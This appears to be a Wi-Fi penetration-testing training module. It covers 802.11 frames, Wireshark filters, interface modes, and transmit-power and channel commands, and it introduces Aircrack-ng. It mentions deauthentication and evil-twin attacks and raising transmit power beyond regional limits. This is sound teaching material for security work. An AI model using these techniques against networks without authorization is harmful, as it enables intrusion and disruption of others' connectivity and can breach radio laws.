# Wi-Fi Penetration Testing Basics Overview

* * *

In today's interconnected world, WiFi networks have become ubiquitous, serving as the backbone of our digital connectivity. However, with this convenience comes the risk of security vulnerabilities that can be exploited by malicious actors. WiFi pentesting, or penetration testing, is a crucial process employed by cybersecurity professionals to assess the security posture of WiFi networks. By systematically evaluating passphrases, configurations, infrastructure, and client devices, WiFi pentesters uncover potential weaknesses and vulnerabilities that could compromise network security. In this module, we'll explore the fundamental principles of WiFi pentesting, covering key aspects of the process and highlighting essential techniques used to assess and enhance the security of WiFi networks.

### Wi-Fi Authentication Types

WiFi authentication types are crucial for securing wireless networks and protecting data from unauthorized access. The main types include WEP, WPA, WPA2, and WPA3, each progressively enhancing security standards.

![image](https://academy.hackthebox.com/storage/modules/222/Wifi_auth_types.png)

- `WEP (Wired Equivalent Privacy)`: The original WiFi security protocol, WEP, provides basic encryption but is now considered outdated and insecure due to vulnerabilities that make it easy to breach.
- `WPA (WiFi Protected Access)`: Introduced as an interim improvement over WEP, WPA offers better encryption through TKIP (Temporal Key Integrity Protocol), but it is still less secure than newer standards.
- `WPA2 (WiFi Protected Access II)`: A significant advancement over WPA, WPA2 uses AES (Advanced Encryption Standard) for robust security. It has been the standard for many years, providing strong protection for most networks.
- `WPA3 (WiFi Protected Access III)`: The latest standard, WPA3, enhances security with features like individualized data encryption and more robust password-based authentication, making it the most secure option currently available.

When we look to get started on our path of becoming wireless penetration testers, we should always consider the fundamental skills required for us to be successful. Knowing these skills can ensure that we do not get lost along the way when we are exploring many different authentication mechanisms and protections. After all, although wi-fi is one of the most available areas of perimeter security for our exploitation, it presents difficulty to even some of the most seasoned veterans.

A WiFi penetration test comprises the following four key components:

- Assessing passphrases for strength and security
- Analyzing configuration settings to identify vulnerabilities
- Probing the network infrastructure for weaknesses
- Testing client devices for potential security flaws

Let's delve into a detailed discussion of these four crucial components.

1. `Evaluating Passphrases`: This involves assessing the strength and security of WiFi network passwords or passphrases. Pentesters employ various techniques, such as dictionary attacks, brute force attacks, and password cracking tools, to evaluate the resilience of passphrases against unauthorized access.

2. `Evaluating Configuration`: Pentesters analyze the configuration settings of WiFi routers and access points to identify potential security vulnerabilities. This includes scrutinizing encryption protocols, authentication methods, network segmentation, and other configuration parameters to ensure they adhere to best security practices.

3. `Testing the Infrastructure`: This phase focuses on probing the robustness of the WiFi network infrastructure. Pentesters conduct comprehensive assessments to uncover weaknesses in network architecture, device configurations, firmware versions, and implementation flaws that could be exploited by attackers to compromise the network.

4. `Testing the Clients`: Pentesters evaluate the security posture of WiFi clients, such as laptops, smartphones, and IoT devices, that connect to the network. This involves testing for vulnerabilities in client software, operating systems, wireless drivers, and network stack implementations to identify potential entry points for attackers.


By systematically evaluating these aspects, pentesters can identify and mitigate security risks, strengthen defenses, and enhance the overall security posture of WiFi networks.

Note: After spawning, please wait `3`- `4` minutes before connecting to the target(s).


# 802.11 Frames and Types

* * *

In order to understand 802.11 traffic better, we can dive into frame construction, types, and subtypes. In 802.11 communications, there are a few different frame types utilized for different actions. These actions are all a part of the connection cycle, and standard communications for these wireless networks. Many of our attacks utilize packet crafting/forging techniques. We look to forge these same frames to perform actions like disconnecting a client device from the network with a deauthentication/disassociation request.

#### The IEEE 802.11 MAC Frame

All 802.11 frames utilize the MAC frame. This frame is the foundation for all other fields and actions that are performed between the client and access point, and even in ad-hoc networks. The MAC data frame consists of 9 fields.

| Field | Description |
| --- | --- |
| Frame Control | This field contains tons of information such as type, subtype, protocol version, to ds (distribution system), from DS, Order, etcetera. |
| Duration/ID | This ID clarifies the amount of time in which the wireless medium is occupied. |
| Address 1, 2, 3, and 4 | These fields clarify the MAC addresses involved in the communication, but they could mean different things depending on the origin of the frame. These tend to include the BSSID of the access point and the client MAC address, among others. |
| SC | The sequence control field allows additional capabilities to prevent duplicate frames. |
| Data | Simply put, this field is responsible for the data that is transmitted from the sender to the receiver. |
| CRC | The cyclic redundancy check contains a 32-bit checksum for error detection. |

#### IEEE 802.11 Frame Types

IEEE frames can be put into different categories for what they do and what actions they are involved in. Generally speaking, we have the following types among some others. These codes can help us when filtering Wireshark traffic.

1. `Management (00):` These frames are used for management and control, and allowing the access point and client to control the active connection.
2. `Control (01):` Control frames are used for managing the transmission and reception of data frames within wi-fi networks. We can consider them like a sense of quality control.
3. `Data (10):` Data frames are used to contain data for transmission.

#### Management Frame Sub-Types

Primarily, for wi-fi penetration testing, we focus on management frames. These frames after all are used to control the connection between the access point and client. As such we can dive into each one, and what they are responsible for.

If we look to filter them in Wireshark, we would specify type `00` and subtypes like the following.

1. `Beacon Frames (1000)`
2. `Probe Request (0100) and Probe Response (0101)`
3. `Authentication Request and Response (1011)`
4. `Association/Reassociation Request and Responses (0000, 0001, 0010, 0011)`
5. `Disassociation/Deauthentication (1010, 1100)`

#### 1\. Beacon Frames

Beacon frames are primarily used by the access point to communicate its presence to the client or station. It includes information such as supported ciphers, authentication types, its SSID, and supported data rates among others.

#### 2\. Probe Requests and Responses

The probe request and response process exist to allow the client to discover nearby access points. Simply put, if a network is hidden or not hidden, a client will send a probe request with the SSID of the access point. The access point will then respond with information about itself for the client.

#### 3\. Authentication Request and Response

Authentication requests are sent by the client to the access point to begin the connection process. These frames are primarily used to identify the client to the access point.

#### 4\. Association/Reassociation Requests

After sending an authentication request and undergoing the authentication process, the client sends an association request to the access point. The access point then responds with an association response to indicate whether the client is able to associate with it or not.

#### 5\. Disassociation/Deauthentication Frames

Disassociation and Deauthentication frames are sent from the access point to the client. Similar to their inverse frames (association and authentication), they are designed to terminate the connection between the access point and the client. These frames additionally contain what is known as a reason code. This reason code indicates why the client is being disconnected from the access point. We utilize crafting these frames for many handshake captures and denial of service based attacks during wi-fi penetration testing efforts.

* * *

# The Connection Cycle

Now that IEEE 802.11 frame types and management frame sub-types have been reviewed, let's examine the typical connection process between clients and access points, known as the `connection cycle`. We will focus on basic WPA2 authentication, although this process may vary depending on the Wi-Fi standard in use. However, the general connection cycle follows this sequence.

1. `Beacon Frames`
2. `Probe Request and Response`
3. `Authentication Request and Response`
4. `Association Request and Response`
5. `Some form of handshake or other security mechanism`
6. `Disassociation/Deauthentication`

To better understand this process, the raw network traffic can be examined in Wireshark. After successfully capturing a valid handshake, the capture file can then be opened in Wireshark for detailed analysis.

Beacon frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/001_beacon.PNG)

Probe request frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 4)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/002_probe_request.PNG)

Probe response frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 5)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/003_probe_response.PNG)

The authentication process between the client and the access point can be observed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/004_authentication.PNG)

After the authentication process is complete, the station's association request can be viewed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/005_association_request.PNG)

The access point's association response can be viewed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 1)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/006_association_response.PNG)

If the example network uses WPA2, the EAPOL (handshake) frames can be viewed using the following Wireshark filter:

`eapol`

![BASICS](https://academy.hackthebox.com/storage/modules/222/007_handshake.PNG)

Once the connection process is complete, the termination of the connection can be viewed by identifying which party (client or access point) initiated the disconnection. This can be done using the following Wireshark filter to capture Disassociation frames (10) or Deauthentication frames (12).

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/008_Disassociation.PNG)

Now that we know a little about the types of frames, in the next section, we will explore the different authentication methods and cover the basic connection cycle between the client and the access point.


# Authentication Methods

* * *

There are two primary authentication systems commonly used in WiFi networks: `Open System Authentication` and `Shared Key Authentication`.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/auth_methods_.png)

- `Open System Authentication` is straightforward and does not require any shared secret or credentials for initial access. This type of authentication is typically used in open networks where no password is needed, allowing any device to connect to the network without prior verification.

- `Shared Key Authentication`, as the name suggests, involves the use of a shared key. In this system, both the client and the access point verify each other's identities by computing a challenge-response mechanism based on the shared key.


While many other methods exist, especially in `Enterprise` environments or with advanced protocols like `WPA3` and `Enhanced Open`, these two are the most prevalent.

* * *

### Open System Authentication

As the name implies, open system authentication does not require any shared secret or credentials right away. This authentication type is commonly found for open networks that do not require a password. For Open System Authentication, it tends to follow this order:

1. The client (station) sends an authentication request to the access point to begin the authentication process.
2. The access point then sends the client back an authentication response, which indicates whether the authentication was accepted.
3. The client then sends the access point an association request.
4. The access point then responds with an association response to indicate whether the client can stay connected.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/Open_system.png)

As shown in the image above, Open System Authentication does not require any credentials or authentication. Devices can connect directly to the network without needing to enter a password, making it convenient for public or guest networks where ease of access is a priority.

While Open System Authentication is convenient for public or guest networks, Shared Key Authentication offers an additional layer of security by ensuring that only devices with the correct key can access the network.

* * *

### Shared Key Authentication

On the other hand shared key authentication does involve a shared key, as the name implies. In this authentication system, the client and access point prove their identities through the computation of a challenge. This method is often associated with Wired Equivalent Privacy ( `WEP`) and Wi-Fi Protected Access ( `WPA`). It provides a basic level of security through the use of a pre-shared key.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/Shared_auth.png)

* * *

#### Authentication with WEP

1. `Authentication request:` Initially, as it goes, the client sends the access point an authentication request.
2. `Challenge:` The access point then responds with a custom authentication response which includes challenge text for the client.
3. `Challenge Response:` The client then responds with the encrypted challenge, which is encrypted with the WEP key.
4. `Verification:` The AP then decrypts this challenge and sends back either an indication of success or failure.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/Wep_process.png)

* * *

#### Authentication with WPA

On the flip side, WPA utilizes a form of authentication that includes a four-way handshake. Commonly, this replaces the association process with more verbose verification, and in the case of WPA3, the authentication portion is even crazier for the pairwise key generation. From a high level, this is performed like the following.

1. `Authentication Request:` The client sends an authentication request to the AP to initiate the authentication process.
2. `Authentication Response:` The AP responds with an authentication response, which indicates that it is ready to proceed with authentication.
3. `Pairwise Key Generation:` The client and the AP then calculate the PMK from the PSK (password).
4. `Four-Way Handshake:` The client and access point then undergo each step of the four way handshake, which involves nonce exchange, derivation, among other actions to verify that the client and AP truly know the PSK.

![image](https://academy.hackthebox.com/storage/modules/222/Auth_Methods/Wpa_process.png)

Shared key authentication type also involves [WPA3](https://documentation.meraki.com/MR/Wi-Fi_Basics_and_Best_Practices/WPA3_Encryption_and_Configuration_Guide), the latest and most secure WiFi security standard. WPA3 introduces significant improvements over its predecessors, including more robust encryption and enhanced protection against brute force attacks. One of its key features is `Simultaneous Authentication of Equals (SAE)`, which replaces the `Pre-Shared Key (PSK)` method used in WPA2, providing better protection for passwords and individual data sessions.

Despite its advantages, WPA3 adoption has been slower due to hardware restrictions. Many existing devices do not support WPA3 and require firmware updates or replacements to be compatible. This creates a barrier to widespread implementation, particularly in environments with a large number of legacy devices. Consequently, while WPA3 offers superior security, its use is not yet widespread, and many networks continue to rely on older standards like WPA2 until the necessary hardware upgrades become more accessible and affordable.

* * *

## Moving On

In this section, we discussed various authentication types. We explored their unique characteristics, security features, and the evolution of these protocols to address emerging threats.

In the next section, we will focus on WiFi interfaces. We will cover several important aspects, including how to:

- Adjust signal strength
- Change frequency and channel settings
- Modify region settings
- Check driver capabilities
- Scan for available WiFi networks

Understanding these elements will enable us to optimize and troubleshoot our wireless connections more effectively. This comprehensive approach will ensure that our networks operate smoothly and efficiently, meeting our specific needs and adapting to different environments.


# Wi-Fi Interfaces

* * *

Wireless interfaces are a cornerstone of wi-fi penetration testing. After all, our machines transmit and receive this data through these interfaces. If we didn't have them, we could not communicate. We must consider many different aspects when choosing the right interface. If we choose too weak of an interface, we might not be able to capture data during our penetration testing efforts. In this section, we will explore all of the things we should consider when purchasing an interface for wi-fi penetration testing.

* * *

#### How to Choose the Right Interface for the Job

One of the first things that we should consider is capabilities. If our interface is capable of 2.4G and not 5G, we might run into issues when attempting to scan higher band networks. This, of course, is an obvious one, but we should look for the following in our interface:

1. `IEEE 802.11ac or IEEE 802.11ax support`
2. `Supports at least monitor mode and packet injection`

Not all interfaces are equal when it comes to wi-fi penetration testing. We might find that a solo 2.4G card performs better than a more "capable," dual-band card. After all, it comes down to driver support. Not all operating systems have complete support for each card, so we should do our research ahead of time into our chosen chipset.

The chipset of a Wi-Fi card and its driver are crucial factors in penetration testing, as it is important to select a chipset that supports both monitor mode and packet injection. [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets) offers a comprehensive list of Wi-Fi adapters based on their performance. It is important to note that for external Wi-Fi adapters, drivers must be installed manually, whereas built-in adapters in laptops typically do not require manual installation. The installation process for drivers varies depending on the adapter, with different steps required for each model.

* * *

#### Interface Strength

Much of wi-fi penetration testing comes down to our physical positioning. As such, if a card is too weak, we might find that our efforts will be inadequate. We should always ensure that our card is strong enough to operate at larger and longer ranges. With this, we might want to shoot for longer range cards. One of the ways that we can check on this is through the iwconfig utility.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

By default, this is set to the country specified in our operating system. We can check on this with the iw reg get command in Linux.

```shell
iw reg get

global
country 00: DFS-UNSET
        (2402 - 2472 @ 40), (6, 20), (N/A)
        (2457 - 2482 @ 20), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
        (2474 - 2494 @ 20), (6, 20), (N/A), NO-OFDM, PASSIVE-SCAN
        (5170 - 5250 @ 80), (6, 20), (N/A), AUTO-BW, PASSIVE-SCAN
        (5250 - 5330 @ 80), (6, 20), (0 ms), DFS, AUTO-BW, PASSIVE-SCAN
        (5490 - 5730 @ 160), (6, 20), (0 ms), DFS, PASSIVE-SCAN
        (5735 - 5835 @ 80), (6, 20), (N/A), PASSIVE-SCAN
        (57240 - 63720 @ 2160), (N/A, 0), (N/A)

```

With this, we can see all of the different txpower settings that we can do for our region. Most of the time, this might be DFS-UNSET, which is not helpful for us since it limits our cards to `20 dBm`. We can change this of course to our own region, but we should abide by pertinent rules and laws when doing this, as it is against the law in different areas to push our card beyond the maximum set limit, and as well it is not always particularly healthy for our interface.

* * *

#### Changing the Region Settings for our Interface

Suppose we lived in the United States, we might want to change our interfaces region accordingly. We could do so with the iw reg set command, and simply change the US to our region's two letter code.

```shell
sudo iw reg set US

```

Then, we could check this setting again with the iw reg get command.

```shell
iw reg get

global
country US: DFS-FCC
        (902 - 904 @ 2), (N/A, 30), (N/A)
        (904 - 920 @ 16), (N/A, 30), (N/A)
        (920 - 928 @ 8), (N/A, 30), (N/A)
        (2400 - 2472 @ 40), (N/A, 30), (N/A)
        (5150 - 5250 @ 80), (N/A, 23), (N/A), AUTO-BW
        (5250 - 5350 @ 80), (N/A, 24), (0 ms), DFS, AUTO-BW
        (5470 - 5730 @ 160), (N/A, 24), (0 ms), DFS
        (5730 - 5850 @ 80), (N/A, 30), (N/A), AUTO-BW
        (5850 - 5895 @ 40), (N/A, 27), (N/A), NO-OUTDOOR, AUTO-BW, PASSIVE-SCAN
        (5925 - 7125 @ 320), (N/A, 12), (N/A), NO-OUTDOOR, PASSIVE-SCAN
        (57240 - 71000 @ 2160), (N/A, 40), (N/A)

```

Afterwards, we can check the txpower of our interface with the `iwconfig` utility.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

In many cases, our interface will automatically set its power to the maximum in our region. However, sometimes we might need to do this ourselves. First, we would have to bring our interface down.

```shell
sudo ifconfig wlan0 down

```

Then, we can set the desired txpower for our interface with the `iwconfig` utility.

```shell
sudo iwconfig wlan0 txpower 30

```

After that, we would need to bring our interface back up.

```shell
sudo ifconfig wlan0 up

```

Next, we can check the settings again by using the `iwconfig` utility.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

The default TX power of a wireless interface is typically set to 20 dBm, but it can be increased to 30 dBm using certain methods. However, caution should be exercised, as this adjustment may be illegal in some countries, and users should proceed at their own risk. Additionally, some wireless models may not support these settings, or the wireless chip might technically be capable of transmitting at higher power, but the device manufacturer may not have equipped the device with the necessary heat sink to safely handle the increased output.

The TX power of the wireless interface can be modified using the previously mentioned command. However, in certain instances, this change may not take effect, which could indicate that the kernel has been patched to prevent such modifications.

* * *

#### Checking Driver Capabilities for our Interface

As mentioned, one of the most important things for our interface, is its capabilities to perform different actions during wi-fi penetration testing. If our interface does not support something, in most cases we simply will not be able to perform that action, unless we acquire another interface. Luckily, we can check on these capabilities via the command line.

The command that we can use to find out this information is the iw list command.

```shell
iw list

Wiphy phy5
	wiphy index: 5
	max # scan SSIDs: 4
	max scan IEs length: 2186 bytes
	max # sched scan SSIDs: 0
	max # match sets: 0
	max # scan plans: 1
	max scan plan interval: -1
	max scan plan iterations: 0
	Retry short limit: 7
	Retry long limit: 4
	Coverage class: 0 (up to 0m)
	Device supports RSN-IBSS.
	Device supports AP-side u-APSD.
	Device supports T-DLS.
	Supported Ciphers:
			* WEP40 (00-0f-ac:1)
			* WEP104 (00-0f-ac:5)
			<SNIP>
			* GMAC-256 (00-0f-ac:12)
	Available Antennas: TX 0 RX 0
	Supported interface modes:
			 * IBSS
			 * managed
			 * AP
			 * AP/VLAN
			 * monitor
			 * mesh point
			 * P2P-client
			 * P2P-GO
			 * P2P-device
	Band 1:
		<SNIP>
		Frequencies:
				* 2412 MHz [1] (20.0 dBm)
				* 2417 MHz [2] (20.0 dBm)
				<SNIP>
				* 2472 MHz [13] (disabled)
				* 2484 MHz [14] (disabled)
	Band 2:
		<SNIP>
		Frequencies:
				* 5180 MHz [36] (20.0 dBm)
				<SNIP>
				* 5260 MHz [52] (20.0 dBm) (radar detection)
				<SNIP>
				* 5700 MHz [140] (20.0 dBm) (radar detection)
				<SNIP>
				* 5825 MHz [165] (20.0 dBm)
				* 5845 MHz [169] (disabled)
	<SNIP>
		Device supports TX status socket option.
		Device supports HT-IBSS.
		Device supports SAE with AUTHENTICATE command
		Device supports low priority scan.
	<SNIP>

```

Of course, this output can be lengthy, but all the information in here is pertinent to our testing efforts. From the above example, we know that this interface supports the following.

1. `Almost all pertinent regular ciphers`
2. `Both 2.4Ghz and 5Ghz bands`
3. `Mesh networks and IBSS capabilities`
4. `P2P peering`
5. `SAE aka WPA3 authentication`

As such, it can be very important for us to check on our interface's capabilities. Suppose we were testing a WPA3 network, and we came to find out that our interface's driver did not support WPA3, we might be left scratching our head.

* * *

#### Scanning Available WiFi Networks

To efficiently scan for available WiFi networks, we can use the `iwlist` command along with the specific interface name. Given the potentially extensive output of this command, it is beneficial to filter the results to show only the most relevant information. This can be achieved by piping the output through grep to include only lines containing `Cell`, `Quality`, `ESSID`, or `IEEE`.

```shell
iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: f0:28:c8:d9:9c:6e
                    Quality=61/70  Signal level=-49 dBm
                    ESSID:"HTB-Wireless"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 02 - Address: 3a:c4:6e:40:09:76
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"CyberCorp"
                    IE: IEEE 802.11i/WPA2 Version 1
          Cell 03 - Address: 48:32:c7:a0:aa:6d
                    Quality=70/70  Signal level=-30 dBm
                    ESSID:"HackTheBox"
                    IE: IEEE 802.11i/WPA2 Version 1

```

From the refined output of the `iwlist` command, we can identify that there are three available WiFi networks. This filtered information focuses on the critical details such as the network cells, signal quality, ESSID, and IEEE specifications, making it straightforward to analyze the available networks.

* * *

#### Changing Channel & Frequency of Interface

We can use the following command to see all available channels for the wireless interface:

```shell
iwlist wlan0 channel

wlan0     32 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          <SNIP>
          Channel 140 : 5.7 GHz
          Channel 149 : 5.745 GHz
          Channel 153 : 5.765 GHz

```

First, we need to disable the wireless interface which ensures that the interface is not in use and can be safely reconfigured. Then we can set the desired `channel` using the `iwconfig` command and finally, re-enable the wireless interface.

```shell
sudo ifconfig wlan0 down
sudo iwconfig wlan0 channel 64
sudo ifconfig wlan0 up
iwlist wlan0 channel

wlan0     32 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          <SNIP>
          Channel 140 : 5.7 GHz
          Channel 149 : 5.745 GHz
          Channel 153 : 5.765 GHz
          Current Frequency:5.32 GHz (Channel 64)

```

As demonstrated in the above output, `Channel 64` operates at a frequency of `5.32 GHz`. By following these steps, we can effectively change the channel of the wireless interface to optimize performance and reduce interference.

If we prefer to change the frequency directly rather than adjusting the channel, we have the option to do so as well.

```shell
iwlist wlan0 frequency | grep Current

          Current Frequency:5.32 GHz (Channel 64)

```

To change the frequency, we first need to disable the wireless interface, which ensures that the interface is not in use and can be safely reconfigured. Then, we can set the desired frequency using the iwconfig command and finally, re-enable the wireless interface.

```shell
sudo ifconfig wlan0 down
sudo iwconfig wlan0 freq "5.52G"
sudo ifconfig wlan0 up

```

We can now verify the current frequency, and this time, we can see that the frequency has been successfully changed to `5.52 GHz`. This change automatically adjusted the channel to the appropriate `channel 104`.

```shell
iwlist wlan0 frequency | grep Current

          Current Frequency:5.52 GHz (Channel 104)

```

* * *

## Moving On

In this section, we explored how to choose the right interface, change the region settings for our interface, set interface strength, check the drivers, and scan for available WiFi networks. With these foundational steps covered, we are now prepared to delve into the next topic.

In the next section, we will delve into the different modes of a wireless interface. We will examine how each mode operates and its specific applications. Understanding these modes will help us utilize wireless interfaces more effectively for diverse purposes, whether it be for routine connectivity, network troubleshooting, or specialized tasks.


# Interface Modes

* * *

There are many more pertinent modes we need to know for our wireless interfaces when we conduct wi-fi penetration testing. After all, each mode is responsible for different capabilities and roles when it comes down to the hierarchy of wi-fi communications. In this section, we will explore each of these separate modes, what they do, and how we can test our interface for their capabilities.

* * *

#### Managed Mode

Managed mode is when we want our interface to act as a client or a station. In other words, this mode allows us to authenticate and associate to an access point, basic service set, and others. In this mode, our card will actively search for nearby networks (APs) to which we can establish a connection.

Pretty much in most cases, our interface will default to this mode, but suppose we want to set our interface to this mode. This could be helpful after setting our interface into monitor mode. We would run the following command.

```shell
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed

```

Then, to connect to a network, we could utilize the following command.

```shell
sudo iwconfig wlan0 essid HTB-Wifi

```

Then, to check our interface, we can utilize the `iwconfig` utility.

```shell
sudo iwconfig

wlan0     IEEE 802.11  ESSID:"HTB-Wifi"
          Mode:Managed  Access Point: Not-Associated   Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Ad-hoc Mode

Secondarily, we could act in a decentralized approach. This is where ad-hoc mode comes into play. Essentially this mode is peer to peer and allows wireless interfaces to communicate directly to one another. This mode is commonly found in most residential mesh systems for their backhaul bands. That is their band that is utilized for AP-to-AP communications and range extension. However, it is important to note, that this mode is not extender mode, as in most cases that is actually two interfaces bridged together.

To set our interface into this mode, we would run the following commands.

```shell
sudo iwconfig wlan0 mode ad-hoc
sudo iwconfig wlan0 essid HTB-Mesh

```

Then, once again, we could check our interface with the `iwconfig` command.

```shell
sudo iwconfig

wlan0     IEEE 802.11  ESSID:"HTB-Mesh"
          Mode:Ad-Hoc  Frequency:2.412 GHz  Cell: Not-Associated
          Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Master Mode

On the flip side of managed mode is master mode (access point/router mode). However, we cannot simply set this with the `iwconfig` utility. Rather, we need what is referred to as a management daemon. This management daemon is responsible for responding to stations or clients connecting to our network. Commonly, in wi-fi penetration testing, we would utilize hostapd for this task. As such, we would first want to create a sample configuration.

```shell
nano open.conf

interface=wlan0
driver=nl80211
ssid=HTB-Hello-World
channel=2
hw_mode=g

```

This configuration would simply bring up an open network with the name HTB-Hello-World. With this network configuration, we could bring it up with the following command.

```shell
sudo hostapd open.conf

wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA 2c:6d:c1:af:eb:91 IEEE 802.11: authenticated
wlan0: STA 2c:6d:c1:af:eb:91 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED 2c:6d:c1:af:eb:91
wlan0: STA 2c:6d:c1:af:eb:91 RADIUS: starting accounting session D249D3336F052567

```

In the above example, hostapd brings our AP up, then we connect another device to our network, and we should notice the connection messages. This would indicate the successful operation of the master mode.

* * *

#### Mesh Mode

Mesh mode is an interesting one in which we can set our interface to join a self-configuring and routing network. This mode is commonly used for business applications where there is a need for large coverage across a physical space. This mode turns our interface into a mesh point. We can provide additional configuration to make it functional, but generally speaking, we can see if it is possible by whether or not we are greeted with errors after running the following commands.

```shell
sudo iw dev wlan0 set type mesh

```

Then we can check our interface once again with the `iwconfig` utility.

```shell
sudo iwconfig

wlan0     IEEE 802.11  Mode:Auto  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Monitor Mode

Monitor mode, also known as promiscuous mode, is a specialized operating mode for wireless network interfaces. In this mode, the network interface can capture all wireless traffic within its range, regardless of the intended recipient. Unlike normal operation, where the interface only captures packets addressed to it or broadcasted, monitor mode enables comprehensive network monitoring and analysis.

Enabling monitor mode typically requires administrative privileges and may vary depending on the operating system and wireless chipset used. Once enabled, monitor mode provides a powerful tool for understanding and managing wireless networks.

First we would need to bring our interface down to avoid a device or resource busy error.

```shell
sudo ifconfig wlan0 down

```

Then we could set our interface's mode with iw {interface name} set {mode}

```shell
sudo iw wlan0 set monitor control

```

Then we can bring our interface back up.

```shell
sudo ifconfig wlan0 up

```

Finally, to ensure that our interface is in monitor mode, we can utilize the `iwconfig` utility.

```shell
iwconfig

wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

Overall, it is important to make sure our interface supports whatever mode is pertinent to our testing efforts. If we are attempting to exploit WEP, WPA, WPA2, WPA3, and all enterprise variants, we are likely sufficient with just monitor mode and packet injection capabilities. However, suppose we were trying to achieve different actions we might consider the following capabilities.

1. `Employing a Rogue AP or Evil-Twin Attack:` \- We would want our interface to support master mode with a management daemon like hostapd, hostapd-mana, hostapd-wpe, airbase-ng, and others.
2. `Backhaul and Mesh or Mesh-Type system exploitation:` \- We would want to make sure our interface supports ad-hoc and mesh modes accordingly. For this kind of exploitation we are normally sufficient with monitor mode and packet injection, but the extra capabilities can allow us to perform node impersonation among others.

In the next section, we will dive into the essentials of Aircrack-ng, a powerful suite of tools designed for wireless network security assessments. We will cover the core functionalities of Aircrack-ng, including how to use it for capturing packets, analyzing network traffic, and cracking WEP and WPA/WPA2 encryption keys. This exploration will provide you with a solid foundation for using Aircrack-ng tools in your own security evaluations and network assessments.


# Introduction to Aircrack-ng

* * *

[Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) comprises a comprehensive suite of tools designed for the evaluation of WiFi network security. Prior to initiating any endeavors to analyze or exploit wireless networks, a foundational understanding of the functionalities inherent within these tools is imperative.

Aircrack-ng focuses on different areas of WiFi security:

- `Monitoring`: Packet capture and export of data to text files for further processing by third party tools.
- `Attacking`: Replay attacks, deauthentication, fake access points and others via packet injection.
- `Testing`: Checking WiFi cards and driver capabilities (capture and injection).
- `Cracking`: WEP and WPA PSK (WPA 1 and 2).

All tools within Aircrack-ng operate through command-line interfaces, facilitating extensive scripting capabilities. This attribute has been leveraged by numerous graphical user interfaces (GUIs). Aircrack-ng predominantly functions on Linux platforms but extends compatibility to Windows, macOS, FreeBSD, OpenBSD, NetBSD, Solaris, and even eComStation 2.

The Aircrack-ng suite encompasses over 20 tools tailored for auditing Wi-Fi networks. We'll concentrate on the six most frequently utilized and essential tools within the suite. These tools are indispensable for various Wi-Fi security auditing tasks and are commonly sought after by users seeking comprehensive network assessment and protection.

| **Tool** | **Description** |
| --- | --- |
| `Airmon-ng` | Airmon-ng can enable and disable monitor mode on wireless interfaces. |
| `Airodump-ng` | Airodump-ng can capture raw 802.11 frames. |
| `Airgraph-ng` | Airgraph-ng can be used to create graphs of wireless networks using the CSV files generated by Airodump-ng. |
| `Aireplay-ng` | Aireplay-ng can generate wireless traffic. |
| `Airdecap-ng` | Airdecap-ng can decrypt WEP, WPA PSK, or WPA2 PSK capture files. |
| `Aircrack-ng` | Aircrack-ng can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID. |

In the upcoming sections, we will go through each of these tools in detail.


# Airmon-ng

* * *

